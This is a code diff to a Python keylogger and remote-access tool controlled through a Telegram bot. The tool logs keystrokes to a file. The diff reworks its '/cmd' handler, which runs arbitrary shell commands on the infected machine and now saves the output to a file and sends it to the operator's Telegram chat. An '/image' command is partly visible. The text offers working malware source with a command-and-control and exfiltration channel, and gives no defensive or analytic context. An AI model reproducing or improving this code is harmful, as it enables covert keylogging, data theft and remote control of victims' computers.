@@ -27,7 +27,7 @@ pip install telepot
 
 
 bot = telepot.Bot('YOUR_API') #api
-chat_id = "ID" 
+chat_id = "YOUR_ID" 
 
 logging.basicConfig(filename=("system.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 #part keylogger buttons
@@ -47,8 +47,19 @@ def receber_comando(msg):
 	if '/cmd' in text:
 		cmd = text.split()
 		proc = os.popen(cmd[1])
-		bot.sendMessage(chat_id, proc.read())
 
+		file_command = open("comand.txt", 'w')
+
+		for line in proc.read():
+			file_command.write(line)
+
+		file_command.close()
+
+		with open("comand.txt", 'rb') as comandu:
+			bot.sendDocument(chat_id, comandu)
+
+		os.remove("comand.txt")
+		
 	if '/image' in text:
 		cmd = text.split()
 		filename = cmd[1]
